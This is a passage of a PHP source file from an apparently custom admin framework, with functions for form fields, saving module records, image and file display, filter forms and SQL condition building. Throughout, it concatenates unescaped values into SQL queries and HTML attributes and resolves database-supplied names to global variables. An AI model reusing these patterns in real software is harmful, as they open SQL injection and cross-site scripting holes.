				<select name="'.$filed.'" id="'.$filed.'" '.$reqt.' '.$p_link.' '.$SelAction.'>';			
				//if($req==0){$ret.='<option value=""></option>';}
				$ret.='<option value=""></option>';
				if($rows>0){
					foreach($data_rows as $d){							
						$sel='';
						if($value==$d['val']){$sel=' selected ';}
						$ret.='<option value="'.$d['val'].'" '.$sel.'>'.$d['name'].'</option>';
					}	
				}
				$ret.='</select></div>';
			}
		}
		if($rebackSelect==0){$ret.='</div>';}
	}else{
		if($Multi==''){
			if($rebackSelect==0){
				// if($linkType==2){
				// 	$s_link='s_link="'.$lll[3].'" deVal="'.$value.'"';
				// 	$echo= '<script>parent_loader+=",'.$lll[1].'";</script>';
				// }
				$ret.='<div '.$s_link.'>';
			}
			$ret.='<div '.$s_link.'>';			
			$ret.='<div class="radioBlc so fl" name="'.$filed.'"  '.$p_link.' '.$s_link.' req="'.$req.'" evn="'.$evn.'">'.$addBut;
			$i=0;
			if($rows>0){
				foreach($data_rows as $d){
					$ch='';
					//if($req==1 && $i==0){$ch=' checked ';}
					if($value==$d['val']){$ch=' checked ';}
					$ret.='<input type="radio" name="'.$filed.'" value="'.$d['val'].'" '.$ch.' >
					<label>'.$d['name'].'</label>';
					$i++;
				}	
			}
			$ret.='</div></div>';
			if($rebackSelect==0){$ret.='</div>';}
		}else{
			$valuess=explode(',',$value);
			$ch_num=rand(10000,99999);
			$ret.='<div class="MultiBlc so fl" chM="'.$filed.'" n="'.$ch_num.'" evn="'.$evn.'">
			<input type="hidden" name="'.$filed.'" id="mlt_'.$filed.'" value="'.$value.'"  n="'.$ch_num.'" >';
			if(count($data_rows)<_listMinSer || $mod=='set'){
				$ret.=$addBut;
				$i=0;
				if($rows>0){
					foreach($data_rows as $d){
						$ch='off';
						if(in_array($d['val'],$valuess)){$ch='on';}
						$ret.='<div class="cMul" v="'.$d['val'].'" ch="'.$ch.'" n="'.$ch_num.'" set>'.$d['name'].'</div>';
						$i++;
					}	
				}
			}else{
				$ret.='<div class="ic40 fl icc1 ic40_edit" title="'.k_edit.'" chME="'.$filed.'"></div>
				<span id="cMEV_'.$filed.'">';
				if($rows>0){
					foreach($data_rows as $d){						
						if(in_array($d['val'],$valuess)){
							$ret.='<div class="cMulSel">'.$d['name'].'</div>';
						}
					}	
				}
				$ret.='</span>';
			}
			$ret.='</div>';
		}
	}
	return $ret;
}
function getThisModInfo(){
	global $PER_ID,$lg;
	$data= get_val_c('_modules_list','title_'.$lg.',icon',$PER_ID,'code');
	if(!$data[0]){$data[0]=_info_7dvjz4qg9g;}
	return $data;
}
function convLangCol($val){
	global $lg;	
	return str_replace('(L)',$lg,$val);
}
function getStaticValSended($data,$sendedData){
	foreach($sendedData as $d){
	if($data==$d[0])return $d[1];}
}
function getStaticVal($data){
	global $thisUser;
	$pars=explode('|',$data);
	$type=$pars[0];
	$val=$pars[1];
	switch($type){
		case 1:$res=$thisUser;break;
		case 2:$res=pp($_GET['id']);break;
		case 3:$res=pp($_POST['id']);break;
		case 4:$res=pp($_GET[$val],'s');break;
		case 5:$res=pp($_POST[$val],'s');break;
		case 6:global ${$val}; $res=${$val};break;
		case 7:$res=$val;break;
	}
	return $res;	
}
function getStaticPars($code){
	$out='';
	$sql="select i.prams ,i.colum from _modules m ,_modules_items i where m.code='$code' and m.id= i.mod_code and i.type=11 ";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	if($rows>0){
		while($r=mysql_f($res)){
			$prams=$r['i.prams'];
			$colum=$r['i.colum'];	
			$out.=$colum.':'.getStaticVal($prams);
			$out.='|';
		}
	}
	$mod_con=sqlModuleCondtionsSend();
	$out.='^'.$mod_con;
	if($out!='^'){$out=Encode($out,_pro_id);}
	return $out;
}
function co_saveForm($id,$mod,$sub=0,$type=1,$fil,$col,$bc=''){
	global $lg_s,$lg_n,$lg_s_f,$lg_n_f,$lg,$now;	
	if($mod_data=loadModulData($mod)){
		$cData=getColumesData($mod);		
		$fil_id=str_replace('cof_','',$fil);		
		if($fil && ($type==1 || $type==2)){
			list($it_type,$ppp)=get_val_c('_modules_items','type,prams',$fil_id,'code');
			$pFil=explode('|',$ppp);
			// if($it_type==5){
				$parsObj=json_decode($ppp,true);		
				$p_table=$parsObj['table'] ?? '';
				$p_col=$parsObj['col'] ?? '';
				$p_view=$parsObj['view'] ?? '';
				$p_c_view=$parsObj['c_view'] ?? '';
				$p_mod_link=$parsObj['mod_link'] ?? '';
				$p_cond=$parsObj['cond'] ?? '';
				$evens=$parsObj['evens'] ?? '';
			// }else{
			// 	$pFil=explode('|',$ppp);
			// }
		}
		if($col){$fil_id=modColumnNo($mod_data['c'],$col);}		
		$table=$mod_data[1];
		$q='';		
		$cols='';
		$vals='';	
		for($i=0;$i<count($cData);$i++){
			$fils=array();
			$fils_name=array();	
			if($cData[$i][9]==1){
				foreach($lg_s as $ls){
					array_push($fils_name,str_replace('(L)',$ls,$cData[$i][1]));
					array_push($fils,'cof_'.$cData[$i]['c'].'_'.$ls);					
					if($fil){
						if($col){
							if($cData[$i][1]==$col && $lg==$ls){
								$backValue=$_POST['cof_'.$fil_id.'_'.$ls];
							}
						}else{							
							if($cData[$i][1]==$p_view && $lg==$ls){							
								$backValue=$_POST['cof_'.$cData[$i]['c'].'_'.$ls];
							}
						}
					}
				}		
			}else{		
				array_push($fils_name,$cData[$i][1]);
				array_push($fils,'cof_'.$cData[$i]['c']); 
				if($fil){				
					if($cData[$i][1]==$p_view){						
						if($col){$backValue=$_POST['cof_'.$fil_id];}
						else{$backValue=$_POST['cof_'.$cData[$i]['c']];}
					}
				}
			}					
			for($f=0;$f<count($fils);$f++){	
                $val='';
				$thisIsPass=0;
				if($cData[$i][3]!=10 && $cData[$i][3]!=15){
					if($cData[$i][3]!=14 || ( $cData[$i][3]==14 && $cData[$i][5]!='staticVal')){		
						if($mod_data[12]==1 && $fils_name[$f]==$mod_data[3]){
							if($id!=0){$val='[xXx]';}else{$val=getMaxValOrder($mod_data[1],$mod_data[3]);}
						}elseif($cData[$i][3]==2){
							if($cData[$i][5]==0){$val=pp($_POST[$fils[$f]],'s');}
							if($cData[$i][5]==1){$val=pp(convDate2Strep($_POST[$fils[$f]],'s'));}
							if($cData[$i][5]==2){if($id!=0){$val='[xXx]';}else{$val=$now;}}
                            if($cData[$i][5]==3){$val=$now;}
						}elseif($cData[$i][3]==3){
							$pars=explode('|',$cData[$i][5]);
							$val=0;if(isset($_POST[$fils[$f]])){$val=1;}
							if($pars[1]==2){
								$resetElse=1;
								if(!$id && !$val){if(getTotalCO($table)==0){$val=1;$resetElse=0;}}
								if($val && $resetElse){mysql_q("UPDATE `$table` set `".$fils_name[$f]."`=0 ");}
							}
						}elseif($cData[$i][3]==12){
                            $pass=$_POST[$fils[$f]];
                            if($id!=0 && $pass=='******'){
                                $thisIsPass=1;
                            }else{                                
                                if($cData[$i][5]==1){                                    
                                    if(passValidate($pass)){
                                        $val=encodePass($pass); 
                                    }else{
                                        exit('x');
                                        $val='[xXx]';
                                    }
                                }else{                                    
                                    $val=encodePass($pass);
                                }
                            }
						}elseif($cData[$i][3]==11){							
							if($id!=0){$val='[xXx]';}else{$val=pp($_POST[$fils[$f]],'s');}
						}else{
							$val=pp($_POST[$fils[$f]],'s');							
						}
						if($cData[$i][3]==4 && $val==''){                            
                            $val='0';
                        }
						if($id==0){
							$cols.="`".$fils_name[$f]."`,";
							$vals.="'".$val."',";
						}else{
							if($thisIsPass==0){                                
								if($val!='[xXx]' || ($cData[$i][3]==3 && $val==0)){
									$vals.="`".$fils_name[$f]."`='".$val."',";
								}else{
                                    $thisIsPass=0;
                                }
                            }
						}
						$bc=str_replace('['.$fils_name[$f].']',$val,$bc);
					}
				}
			}
		}		
		$cols=substr($cols,0,-1);
		$vals=substr($vals,0,-1);
		$mod3=getModNow($mod);
		$chPer3=checkPer($mod3);
		if($id==0){
			if($chPer3[1]){$q="INSERT INTO $table ($cols)values($vals) ";}
			$opr=1;
			$eventType=2;
		}else{
			if($chPer3[2]){$q="UPDATE $table SET $vals where id='$id' ";}
			$opr=2;
			$eventType=4;
		}
        //echo $q;
		if(mysql_q($q)){
			$newId=$id;
			if($id==0){$newId=last_id();}						
			logOpr($newId,$opr);
			if($type==3){
				if($fil){
					$fileds=explode(',',$fil);
					for($f=0;$f<count($fileds);$f++){
						$f_val=get_val($mod_data[1],convLangCol($fileds[$f]),$newId);
						$bc=str_replace('['.$fileds[$f].']',$f_val,$bc);
					}
				}
				$out=stripcslashes($bc);
			}else{
				if($sub>0){
					if($fil && ($type==1 || $type==2)){
						$out= $fil.'|'.$newId.'|'.stripcslashes($backValue);
					}
				}else{
					if($type==2 && $col==2){
						$out= 'edit_In';
					}else{
						$out= 1;
					}
				}
			}
		}else{
			$out= 0;
		}		
		$evn='<!--***-->'.checkMevents($eventType,$mod_data[17],$newId);
		return $out.$evn;
	}	
}
function encodePass($pass){
    $pass=md5($pass);
    $pass=password_hash($pass,PASSWORD_DEFAULT);
    return $pass;
}
 function passValidate($password){
    // Validate password strength
    $uppercase = preg_match('@[A-Z]@', $password);
    $lowercase = preg_match('@[a-z]@', $password);
    $number    = preg_match('@[0-9]@', $password);
    $specialChars = preg_match('@[^\w]@', $password);

    if(!$uppercase || !$lowercase || !$number || !$specialChars || strlen($password) < 8) {
        return false;
    }else{
       return true;
    }
}
function viewPhotosImg($ids,$dir=1,$num=1,$w=60,$h=60,$pTitle='',$grp='-'){
	global $m_path,$folderBack;
	$photos=getImages($ids);
	$n=count($photos);
	$num_s='';
	$bf=$folderBack;
	if($num==1 && $n>1){$num_s='<div class="im_num fr">'.$n.'</div>';}
	$res='';
	for($i=0;$i<$n;$i++){
		$id=$photos[$i]['id'];
		$file=$photos[$i]['file'];
		$folder=$photos[$i]['folder'];
		$txt=$photos[$i]['name'];		
		if($pTitle==''){$pTitle=$txt;}
		$ex=$photos[$i]['ex'];
		$this_file=$m_path.'upi/'.$folder.$file;
        if($ex=='svg'){
            $this_fileBig=$this_file.'.'.$ex;		    
        }else if($ex=='mp4'){
            $this_fileBig=$this_file.'.'.$ex.'?iframe=true&width=80%&height=80%';		    
        }else{
            $this_fileBig=resizeImage($file,"sData/".$folder,1200,1200,'bi',$m_path.'imup/',$dir,'sData/resize/',$ex);
        }
		//$r_file=$bf."sData/".$photos[$i]['folder'].$photos[$i]['file'];
        $realFile=$bf.'sData/'.$photos[$i]['folder'].$photos[$i]['file'];
        if($ex=='svg' || $ex=='mp4'){
            $realFile=$bf.'sData/'.$photos[$i]['folder'].$photos[$i]['file'].'.'.$ex;
        }
		if(file_exists($realFile)){
			//$image=Croping($file,"sData/".$folder,$w,$h,'i',$m_path.'imup/',$dir,'sData/resize/',$ex);
            if($ex=='svg'){
                $image=$this_file.'.'.$ex;
            }else if($ex=='mp4'){
                //$image=$this_file.'.'.$ex;
                $image=$m_path.'images/sys/video.png';
            }else{
                $image=Croping($file,"sData/".$folder,$w,$h,'i',$m_path.'imup/',$dir,'sData/resize/',$ex);
                $this_fileBig=resizeImage($file,"sData/".$folder,1200,1200,'bi',$m_path.'imup/',$dir,'sData/resize/',$ex);
            }
			//list($org_w,$org_h)=getimagesize($r_file);
			//$res.='<div class="fl">'.$num_s.'
			//<img class="alb_imgs" src="'.$image.'" id="im_'.$id.'" onclick="showPhoto(\'im_'.$id.'\')" 
			//file="'.$this_file.'" org_w="'.$org_w.'" org_h="'.$org_h.'"/></div>';
			
			$grpN='';
			if($grp && $n>1){$grpN='[g'.$grp.']';}
			if($i<$num){			
				$res.='
				<div class="fl" href="'.$this_fileBig.'" rel="lf'.$grpN.'" title="'.$pTitle.'">'.$num_s.'
				<img class="alb_imgs" width="50" src="'.$image.'" id="im_'.$id.'" style="width:100%;height:100%;max-width:70px;max-height:70px"/>	
				</div>';
			}else{
				$res.='<div class="hide" href="'.$this_fileBig.'" rel="lf'.$grpN.'" title="'.$pTitle.'"></div>';
			}
		}
	}
	if($res){
		$res='<div class="in_list_img fl">'.$res.'</div>';
	}
	return $res;
}
function viewFile($ids,$dir=0,$num=1,$w=50,$h=50){
	global $f_path;
	$fil=getFiles($ids);
	$n=count($fil);
	$num_s='';
	if($num==1 && $n>1){$num_s='<div class="im_num fr">'.$n.'</div>';}
	$res='';
	for($i=0;$i<min($n,$num);$i++){		
		$id=$fil[$i]['id'];
		$ex=$fil[$i]['ex'];
		$name=$fil[$i]['name'];
		$code=$fil[$i]['code'];
		$date=$fil[$i]['date'];
		$this_file=$f_path.'DownFile/'.$date.'.'.$code;
		$res.='<a href="'.$this_file.'" target="block" ><div class="fl ff file_box" set="0" no="'.$id.'" style="width:'.$w.'px;height:'.$h.'px;line-height:'.$h.'px" title="'.$name.'">'.$ex.'</div></a>';
	}
	//$res.='</div>';
	return $res;
}
function getFiles($ids){
	$files=array();
	if($ids){
		$sql="select * from _files where id IN($ids) ";
		$res=mysql_q($sql);
		$rows=mysql_n($res);
		if($rows>0){
			while($r=mysql_f($res)){
				array_push($files,$r);
			}
		}
	}
	return $files;
}
function getFileLink($id){
	global $f_path;
	$r=getRec('_files',$id);
	if($r['r']){
		return $f_path.'DownFile/'.$r['date'].'.'.$r['code'];
	}	
}
function getImages($ids){
	$files=array();
	if($ids){
		$sql="select * from _files_i where id IN($ids) ";
		$res=mysql_q($sql);
		$rows=mysql_n($res);
		if($rows>0){
			while($r=mysql_f($res)){
				$id=$r['id'];
				$file=$r['file'];
				$date=$r['date'];
				$name=$r['name'];
				$ex=$r['ex'];
				$folder=date('y-m',$date).'/';				array_push($files,array('file'=>$file,'id'=>$id,'folder'=>$folder,'ex'=>$ex,'name'=>$name));
			}
		}
	}
	return $files;
}
function getUpFiles($ids){
	$files=array();
	if($ids){
		$sql="select * from _files where id IN($ids) ";
		$res=mysql_q($sql);
		$rows=mysql_n($res);
		if($rows>0){
			while($r=mysql_f($res)){
				$id=$r['id'];
				$file=$r['file'];
				$date=$r['date'];
				$name=$r['name'];
				$ex=$r['ex'];
				$folder=date('y-m',$date).'/';				
				array_push($files,array('file'=>$file,'id'=>$id,'folder'=>$folder,'ex'=>$ex,'name'=>$name));
			}
		}
	}
	return $files;
}
function getModuleTilte($module){
	global $mod_data,$d_title,$LDA;
	$title=$mod_data[2];
	if($title==''){$title=$d_title;}else{$title=get_key($title);}	
	return $title;	
}
function get_key($key){
	global $LDA1,$LDA2,$LDA3;       
	$out='';
	if(is_array($key)){
		$key=implode(' ',$key);
	}
	$keys=explode(' ',$key);
	foreach($keys as $k){
        //echo '<div>('.$k.')</div>'; 
		$w=$k;
		if(substr($k,0,2)=='k_'){
            if(isset($LDA1[$k])){
                $w=$LDA1[$k];
            }else if(isset($LDA2[$k])){
                $w=$LDA2[$k];
            }else if(isset($LDA3[$k])){
                $w=$LDA3[$k];
            }
        }
		if($out!=''){$out.=' ';}
		$out.=$w;
	}
	return $out;
}
function getModuleParameters($module){
	global $mod_data,$f_path;
	$out='';
	if($mod_data[7]){
		if($mod_data[6]==1){$out.='add|';}
		if($mod_data[6]==2){$out.='add:'.$f_path.'add/'.$module.'|';}
		if($mod_data[6]==3){$out.='add:'.$f_path.$mod_data[8].'|';}
	}
	return $out;	
}
function get_aadtions_tasks($mod_code){
	global $m_path;
	$sql="select * from _modules_butts where mod_code='$mod_code' ";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	$out='';
	while($r=mysql_f($res)){
		$id=$r['id'];
		$title=stripslashes($r['title']);
		$function=stripslashes($r['function']);
		$style=stripslashes($r['style']);
		
		//$function=str_replace('[id]',$rec_id,$function);
		/*$out.='<div class="fr ic40w icc1" style="background-image:url('.$m_path.'im/'.$style.'.png)" title="'.get_key($title).'"  onclick="'.$function.'" ></div>';*/
        $out.='<div class="fr ic40w '.$style.'" title="'.get_key($title).'"  onclick="'.$function.'" ></div>';
	}
	return $out;
}
function co_isDeletebl($mod,$val){
	$mod_code=$mod['c'];
	$out=true;
	/*********************/
	$cData=getColumesData($mod_code);
	foreach($cData as $d){	
		if($d[3]==3){
			$dd=explode('|',$d[5]);
			if($dd[1]==2){
				if(get_val($mod[1],$d[1],$val)==1){return false;};
			}
		}
	}
	/*********************/
	$sql="select * from _modules_links where mod_code='$mod_code'";
	$res=mysql_q($sql);
	$rows=mysql_n($res);
	if($rows>0){
		while($r=mysql_f($res)){
			$table=$r['table'];
			$colume=$r['colume'];
			$v=$r['val'];
			if($v!=''){
				$sql2="SELECT count(*)c from $table where id='$val' and `$colume` $v ";
			}else{
				$sql2="SELECT count(*)c from $table where `$colume`='$val' ";				
			}
			$res2=mysql_q($sql2);
			$r2=mysql_f($res2);
			$rows2=$r2['c'];
			if($rows2>0){return false;break;}
		}
	}
	return $out;
}
function modFilter($mod,$sptf){
	global $lg,$lg_s,$lg_n,$thisUser;
	$x_filter=array();		
	if($sptf!='^'){
		$d1=explode('^',Decode($sptf,_pro_id));
		$d2=explode('|',$d1[1]);
		for($s=0;$s<count($d2);$s++){
			$d3=explode(':',$d2[$s]);
			array_push($x_filter,$d3[0]);
		}
	}	
	if($mod){
	$sendData='';
	$out='<div class="filterForm so" p="">';
	$mod_data=loadModulData($mod);
	$show_id=$mod_data[14];
	$table=$mod_data[1];	
	$cData=getColumesData($mod,0,0,' (`act`=1 or `show`=1 )');
	//$filId=get_val();
	if($show_id){		
		$out.='<div class="f1" txt>'.k_num.'</div>
		<div><input type="number" id="fil_0" /></div>';
		$sendData.='0:0:0|';
	}
	
	foreach($cData as $data){
        
		if(!in_array($data[1],$x_filter))	
		if($data[11]!=0){
			$sendData.=$data['c'].':'.$data[3].':'.$data[11].'|';	
			$prams=explode('|',$data[5]);	
			$pramsObj=json_decode($data[5],true);
			
			$p_table=$pramsObj['table'] ?? '';
			$p_col=$pramsObj['col'] ?? '';
			$p_view=$pramsObj['view'] ?? '';
			$p_c_view=$pramsObj['c_view'] ?? '';
			$p_mod_link=$pramsObj['mod_link'] ?? '';
			$p_cond=$pramsObj['cond'] ?? '';
			$p_evens=$pramsObj['evens'] ?? '';

			$fil=$data[11];
			if($fil){                
				switch($fil){
				case 1:                    
					if($data[3]==1 || $data[3]==14){
						$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
						<div><input type="text" id="fil_'.$data['c'].'" /></div>';					
					}
					if($data[3]==2){
						if($data[5]==0){
							$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
							<div><input type="text" class="fil_Date" id="fil_'.$data['c'].'" /></div>';
						}
					}
					if($data[3]==5){
						$p_tag=0;
						$s_tag=0;
						$p_tag_txt='';
						$s_tag_txt='';
						$p_tag_id='';
						$s_tag_id='';
						if($data[12]!=''){
							$l=explode('^',$data[12]);
							$oprC=count($l);
							if($oprC==1){
								$ll=explode('|',$l[0]);
								if($ll[0]==1){
									$p_tag=1;
									$p_tag_id=$ll[1];
								}else{
									$s_tag=1;
									$s_tag_id=$ll[3];
								}
							}else{
								$ll=explode('|',$l[0]);
								$lp=explode('|',$l[1]);								
								$p_tag=1;
								$p_tag_id=$lp[1];
								$s_tag=1;
								$s_tag_id=$ll[3];
							}
							if($s_tag){$s_tag_txt=' id="filSun_'.$s_tag_id.'" ';}
							if($p_tag){$p_tag_txt=' filPar="'.$p_tag_id.'" ';}
						}
						$Q=$prams[4];
								
						//$Q=cekActColun($table,$Q);
						$Q=cekActColun($p_table,$Q);
						$Q=str_replace('[user]',$thisUser,$Q);
						$Q=readVarsInText($Q);						
						if($Q){$Q=" WHERE ".$Q;}
																
						$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
						<div '.$s_tag_txt.' '.$p_tag_txt.'>'.make_Combo_box($p_table,str_replace('(L)',$lg,$p_view),$p_col,$Q,'fil_'.$data['c'],0).'</div>';
					}
					if($data[3]==6){
						$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
						<div>'.selectFromArrayWithVal('fil_'.$data['c'],$prams).'</div>';					
					}
					if($data[3]==9){
						$out.='<div class="f1" txt>'.get_key($data[2]).'</div><div>';
						$out.='<select id="fil_'.$data['c'].'"><option></option>';
						for($l=0;$l<count($lg_s);$l++){$out.='<option value="'.$lg_s[$l].'">'.$lg_n[$l].'</option>';}
						$out.='</select></div>';					
                    }
				break;
				case 2:
					$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
					<div><input type="text" id="fil_'.$data['c'].'" /></div>';
				break;
				case 3:
					$out.='
					<div class="f1" txt>'.get_key($data[2]).'</div>
					<div class="cb">
					<div class="fl" style="width:100px; margin-'.k_Xalign.':8px;">
						<div class="f1" txt>'.k_from.'</div>
						<div><input type="text" class="fil_Date" name="fil_'.$data['c'].'_1"/></div>				
					</div>
					<div class="fl" style="width:100px">
						<div class="f1" txt>'.k_to.'</div>
						<div><input type="text" class="fil_Date" name="fil_'.$data['c'].'_2"/></div>
					</div>
					</div><div class="cb"></div>				
					';
				break;
				case 4:					
					if($data[3]==3 || $data[3]==4 || $data[3]==8){
						$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
						<div>
						<div class="filBut fl" val="1" link="fil_'.$data['c'].'" style=" margin-'.k_Xalign.':6px;">'.k_yes.'</div>
						<div class="filBut fl" val="0" link="fil_'.$data['c'].'">'.k_no.'</div>
						<input type="hidden" id="fil_'.$data['c'].'" value=""/>
						</div>';										
					}
					if($data[3]==11){						
						if($data[5]==1){
							$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
							<div>'.make_Combo_box('_users','name_'.$lg,'id','where '.$prams[1],'fil_'.$data['c'],0).'</div>';	
						}elseif($prams[0]==1){
							$cond='';
							if($prams[1]){
								$cond='where '.$prams[1];
							}
							$out.='<div class="f1" txt>'.get_key($data[2]).'</div>
							<div>'.make_Combo_box('_users','name_'.$lg,'id',$cond,'fil_'.$data['c'],0).'</div>';
						}
					}
				break;
				}
			}
		}
	}
	$out.='</div>
	<div class="ser_icons cb">		
		<div class="fil_rest fl"></div>
	</div>
	<script>fil_pars="'.$sendData.'"</script>';
	}
	return $out;
}
function filterCustom($filter,$page,$reset=1){
	global $lg;
	$out='';
	if($filter){
		$sendData='';		
		$out.='<div class="filterForm so" p="'.$page.'">';
		$f=explode('|',$filter);
		foreach($f as $ff){
			$fff=explode(':',$ff);			
			if($fff[0]==1){//text
				$out.='<div class="f1" txt>'.get_key($fff[1]).'</div>
				<div><input type="text" id="fil_'.$fff[2].'" /></div>';
				$sendData.=$fff[2].':0:0|';
			}
			if($fff[0]==2){//date
				$out.='<div class="f1" txt>'.get_key($fff[1]).'</div>
				<div><input type="text" class="fil_Date" id="fil_'.$fff[2].'" /></div>';
				$sendData.=$fff[2].':2:1|';
			}
			if($fff[0]==3){//select
				$prams=explode('^',$fff[3]);
				$out.='<div class="f1" txt>'.get_key($fff[1]).'</div>
				<div>'.make_Combo_box($prams[0],str_replace('(L)',$lg,$prams[2]),$prams[1],$prams[3],'fil_'.$fff[2],0).'</div>';
				$sendData.=$fff[2].':0:0|';
			}
			if($fff[0]==4){//list
				$data=array();
				$prams=explode('^',str_replace('-',':',$fff[3]));				
				$out.='<div class="f1" txt>'.get_key($fff[1]).'</div>
				<div>'.selectFromArrayWithVal('fil_'.$fff[2],$prams).'</div>';	
				$sendData.=$fff[2].':0:0|';			
			}
			if($fff[0]==5){//reange
				$out.='
				<div class="f1" txt>'.get_key($fff[1]).'</div>
				<div class="cb">
				<div class="fl" style="width:100px; margin-'.k_Xalign.':8px;">
					<div class="f1" txt>'.k_from.'</div>
					<div><input type="text" class="fil_Date" name="fil_'.$fff[2].'_1"/></div>				
				</div>
				<div class="fl" style="width:100px">
					<div class="f1" txt>'.k_to.'</div>
					<div><input type="text" class="fil_Date" name="fil_'.$fff[2].'_2"/></div>
				</div>
				</div><div class="cb"></div>				
				';
				$sendData.=$fff[2].':2:2|';
			}
			if($fff[0]==6){//active
				$out.='<div class="f1" txt>'.get_key($fff[1]).'</div>
				<div>
				<div class="filBut fl" val="1" link="fil_'.$fff[2].'" style=" margin-'.k_Xalign.':6px;">'.k_yes.'</div>
				<div class="filBut fl" val="0" link="fil_'.$fff[2].'">'.k_no.'</div>
				<input type="hidden" id="fil_'.$fff[2].'" value=""/>
				</div>';
				$sendData.=$fff[2].':0:0|';									
			}
		}
		$out.='</div>
		<div class="ser_icons cb"><div class="fil_rest fl"></div></div>
		<script>fil_pars="'.$sendData.'"</script>';
	}
	return $out;
}
function resetOrder($table,$ord){	
	$sql="select id,`$ord` from $table order by `$ord` ASC";
	$res=mysql_q($sql);
	$i=1;
	while($r=mysql_f($res)){
		$id=$r['id'];
		mysql_q("update $table set `$ord`='$i' where id='$id' ");
		$i++;
	}
}
function sqlFilterCondtions($mod,$fil){
	global $mod_data,$lg_s;
	$fil=addslashes($fil);
	$cData=getColumesData($mod,1,0,"act>=0");
	$query='';

	$first=0;
	if($fil!=''){
		$query="";
		$filters=explode('|',$fil);
		$filtersCount=count($filters);
		$i=0;
		foreach($filters as $f){			
			if($f!=''){
				$ff=explode(':',$f);
				$id=$ff[0];
				$val=$ff[1];
				$val2=$ff[2];
				$type=$cData[$id][3];				
				unset($clomns);
				$clomns=array();				
				if($id=='0'){
					$filType=1;
					array_push($clomns,'id');
				}else{
					$filType=$cData[$id][11];
					if($cData[$id][9]){
						foreach($lg_s as $ls){
							array_push($clomns,str_replace('(L)',$ls,$cData[$id][1]));
						}
					}else{
						array_push($clomns,$cData[$id][1]);
					}
				}
				$colTotal=count($clomns);
				for($c=0;$c<$colTotal;$c++){
					if($colTotal>1 && $c==0){$query.=' (';}
					$clomn=$clomns[$c];
					switch($filType){
						case 1:$query.=" `$clomn` = '$val' ";								
						break;
						case 2:					
							if(in_array($type,array(1,7,13,14))){  
								$query.=" `$clomn` LIKE '%$val%' ";
							}
							if($type==4 || $type==8){
								$query.=" id IN (SELECT t.id FROM 
								_files f, ".$mod_data[1]." t 
								WHERE m_file_name LIKE '%$val%' AND f.id IN(t.$clomn)) ";							 
							}
							if($type==5){
								//$pars=explode('|',$cData[$id][5]);
								$pars=json_decode($cData[$id][5],true);
								$p_table=$pars['table'] ?? '';
								$p_col=$pars['col'] ?? '';
								$p_view=$pars['view'] ?? '';
								$p_c_view=$pars['c_view'] ?? '';
								$p_mod_link=$pars['mod_link'] ?? '';
								$p_cond=$pars['cond'] ?? '';
								$p_evns=$pars['evns'] ?? '';
								$query.=" `".$cData[$id][1]."` IN 
								( select id from  `$p_table` where ".convLangCol($p_view)." LIKE '%$val%' ) ";
							}
						break;
						case 3:
							$q1=$q2='';
							if($type==2){
								if($cData[$id][5]>0){
									if($val!='')$val=convDate2Strep($val);
									if($val2!='')$val2=convDate2Strep($val2)+86400;
								}							
								if($val!=''){$q1=" `$clomn` >= '$val' ";}
								if($val2!=''){$q2.=" `$clomn` < '$val2' ";}
								$query.=$q1;
								if($q1!='' && $q2!=''){$query.=" and ";}
								$query.=$q2;													
							}
						break;
						case 4:
							if($type==3){						
								$query.=" `$clomn` = '$val' ";
							}
							if($type==11){						
								$query.=" `$clomn` = '$val' ";
							}	
						break;
					}
					if($colTotal>1){
						if($c+1==$colTotal){$query.=' )';}else{$query.=' || ';}
					}
				}
			}
			if($i<$filtersCount-2){$query.=" and ";}
			$i++;
		}		
	}
	return $query;
}
function sqlModuleCondtionsSend($mod=0){
	global $mod_data,$thisUser;
	if($mod==0){
		$mod=$mod_data['c'];
	}
	$out='';
	$sql="select * from _modules_cons where mod_code='$mod'";
	$res=mysql_q($sql);
	$rows=mysql_n($res);	
	if($rows>0){
		while($r=mysql_f($res)){
			$q='';
			$colume=$r['colume'];
			$type=$r['type'];
			$val=$r['val'];
			switch($type){
				case 1:$out.=$colume.':'.$thisUser;	break;
				case 2:if(isset($_GET['id'])){$out.=$colume.':'.pp($_GET['id'],'s');}break;
				case 3:if(isset($_POST['id'])){$out.=$colume.':'.pp($_POST['id'],'s');}break;				
				case 4:if($val!='' && isset($_GET[$val])){$out.=$colume.':'.pp($_GET[$val],'s');}break;
				case 5:if($val!='' && isset($_POST[$val])){$out.=$colume.':'.pp($_POST[$val],'s');}break;
				case 6:global ${$val};if(isset(${$val})){$out.=$colume.':'.${$val};}break;
				case 7:if($val!=''){$out.=$colume.':'.$val;}break;
				case 8:if($val!=''){$out.=readVarsInText($val);}break;
			}
			$out.='|';
		}
	}
	return $out;
}

function readVarsInText($val){
	if($val!=''){
		$finVal='';
		$vv=explode(' ',$val);
		foreach($vv as $v){					
            if(substr($v,0,1)=='$'){
                global ${substr($v,1)};
                $finVal.=' '.${substr($v,1)};
		    }else{
			     $finVal.=' '.$v;
            }
		}
		return $finVal;
	}
}

function readVarsInTextOld($val){
	if($val!=''){
		$finVal='';
		$vv=explode('$',$val);
		if(count($vv)>1){
			$w=explode(' ',$val);						
			foreach($w as $ww){				
				if(substr($ww,0,1)=='$'){
					global ${substr($ww,1)};
					$ww=${substr($ww,1)};					
				}
				$finVal.=$ww.' ';
			}
		}else{
			$finVal=$val;
		}
		return $finVal;
	}
}
function sqlModuleCondtions($data,$condtion){
	if($data!='^'){
		$out='';
		$first=0;
		if($condtion!=''){$first=1;}
		$d=explode('^',$data);
		$d2=explode('|',$d[1]);
		for($s=0;$s<count($d2);$s++){
			$q='';
			$d3=explode(':',$d2[$s]);
			if(count($d3)==2){
				$colume=$d3[0];
				$val=$d3[1];
				$q=" `$colume` = '$val' ";
			}else{				
				if($d2[$s]!=''){$q=" $d2[$s] ";}
			}
			if($q!=''){if($first==0){$q=checkVars($q);$out.=" $q ";$first=1;}else{$out.=" and $q ";}}			
		}
	}
	return $out;
}
function checkVars($q){
	$qs=explode('$',$q);
	$var=array();
	foreach($qs as $v){
		$v2=explode(' ',$v);
		$v3=$v2[0];
		$v3=str_replace("'",'',$v3);
		$v3=str_replace('"','',$v3);
		$v3=str_replace('`','',$v3);
		array_push($var,$v3);
	}
